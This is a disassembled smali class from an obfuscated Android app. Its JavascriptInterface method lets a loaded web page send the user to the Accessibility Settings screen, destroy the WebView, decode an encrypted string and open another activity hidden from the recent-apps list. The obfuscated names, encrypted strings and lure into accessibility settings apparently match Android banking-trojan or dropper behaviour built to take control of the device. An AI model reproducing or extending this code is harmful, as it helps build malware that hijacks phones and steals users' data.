.class public final Lcom/cisojemopatude/yazi/catozotu/zafewo$e;
.super Ljava/lang/Object;
.source ""


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/cisojemopatude/yazi/catozotu/zafewo;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x11
    name = "e"
.end annotation


# instance fields
.field public final synthetic a:Lcom/cisojemopatude/yazi/catozotu/zafewo;


# direct methods
.method public constructor <init>(Lcom/cisojemopatude/yazi/catozotu/zafewo;Landroid/content/Context;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            ")V"
        }
    .end annotation

    iput-object p1, p0, Lcom/cisojemopatude/yazi/catozotu/zafewo$e;->a:Lcom/cisojemopatude/yazi/catozotu/zafewo;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final onData()V
    .locals 4
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    sget-object v0, Lcom/cisojemopatude/yazi/catozotu/zafewo;->h:Lcom/cisojemopatude/yazi/catozotu/zafewo;

    const/4 v0, 0x1

    .line 1
    sput v0, Lcom/cisojemopatude/yazi/catozotu/zafewo;->j:I

    .line 2
    const-string v1, "1"

    .line 3
    sput-object v1, Lcom/cisojemopatude/yazi/catozotu/zafewo;->i:Ljava/lang/String;

    .line 4
    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.settings.ACCESSIBILITY_SETTINGS"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/cisojemopatude/yazi/catozotu/zafewo$e;->a:Lcom/cisojemopatude/yazi/catozotu/zafewo;

    const/16 v3, 0x3039

    invoke-virtual {v2, v1, v3}, Landroid/app/Activity;->startActivityForResult(Landroid/content/Intent;I)V

    :try_start_0
    iget-object v1, p0, Lcom/cisojemopatude/yazi/catozotu/zafewo$e;->a:Lcom/cisojemopatude/yazi/catozotu/zafewo;

    .line 5
    iget-object v1, v1, Lcom/cisojemopatude/yazi/catozotu/zafewo;->g:Landroid/webkit/WebView;

    if-eqz v1, :cond_4

    const/4 v2, 0x0

    if-nez v1, :cond_0

    move-object v1, v2

    goto :goto_0

    .line 6
    :cond_0
    invoke-virtual {v1}, Landroid/webkit/WebView;->getParent()Landroid/view/ViewParent;

    move-result-object v1

    :goto_0
    check-cast v1, Landroid/view/ViewGroup;

    if-nez v1, :cond_1

    goto :goto_1

    :cond_1
    iget-object v3, p0, Lcom/cisojemopatude/yazi/catozotu/zafewo$e;->a:Lcom/cisojemopatude/yazi/catozotu/zafewo;

    .line 7
    iget-object v3, v3, Lcom/cisojemopatude/yazi/catozotu/zafewo;->g:Landroid/webkit/WebView;

    .line 8
    invoke-virtual {v1, v3}, Landroid/view/ViewGroup;->removeView(Landroid/view/View;)V

    :goto_1
    iget-object v1, p0, Lcom/cisojemopatude/yazi/catozotu/zafewo$e;->a:Lcom/cisojemopatude/yazi/catozotu/zafewo;

    .line 9
    iget-object v1, v1, Lcom/cisojemopatude/yazi/catozotu/zafewo;->g:Landroid/webkit/WebView;

    if-nez v1, :cond_2

    goto :goto_2

    .line 10
    :cond_2
    invoke-virtual {v1}, Landroid/webkit/WebView;->removeAllViews()V

    :goto_2
    iget-object v1, p0, Lcom/cisojemopatude/yazi/catozotu/zafewo$e;->a:Lcom/cisojemopatude/yazi/catozotu/zafewo;

    .line 11
    iget-object v1, v1, Lcom/cisojemopatude/yazi/catozotu/zafewo;->g:Landroid/webkit/WebView;

    if-nez v1, :cond_3

    goto :goto_3

    .line 12
    :cond_3
    invoke-virtual {v1}, Landroid/webkit/WebView;->destroy()V

    :goto_3
    iget-object v1, p0, Lcom/cisojemopatude/yazi/catozotu/zafewo$e;->a:Lcom/cisojemopatude/yazi/catozotu/zafewo;

    .line 13
    iput-object v2, v1, Lcom/cisojemopatude/yazi/catozotu/zafewo;->g:Landroid/webkit/WebView;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_4

    :catch_0
    move-exception v1

    const-string v2, "RDVoY3k1ZzZzVkxySkVTNTFVTEcrQT09Ojp2em04QkdLQXFqRGFvVUdRVUI5YUtBPT0="

    .line 14
    invoke-static {v2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/Exception;->getLocalizedMessage()Ljava/lang/String;

    .line 15
    sget-object v1, Lb0/b;->a:Lb0/b;

    .line 16
    :cond_4
    :goto_4
    sget-object v1, Lcom/cisojemopatude/yazi/catozotu/zafewo;->h:Lcom/cisojemopatude/yazi/catozotu/zafewo;

    invoke-static {}, Lcom/cisojemopatude/yazi/catozotu/zafewo;->a()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->length()I

    move-result v1

    if-lez v1, :cond_5

    goto :goto_5

    :cond_5
    const/4 v0, 0x0

    :goto_5
    if-eqz v0, :cond_6

    iget-object v0, p0, Lcom/cisojemopatude/yazi/catozotu/zafewo$e;->a:Lcom/cisojemopatude/yazi/catozotu/zafewo;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lcom/cisojemopatude/yazi/catozotu/zafewo$e;->a:Lcom/cisojemopatude/yazi/catozotu/zafewo;

    const-class v3, Lcom/cisojemopatude/yazi/catozotu/serezupifurizu;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v2, 0x20000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v2, 0x800000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    :cond_6
    return-void
.end method
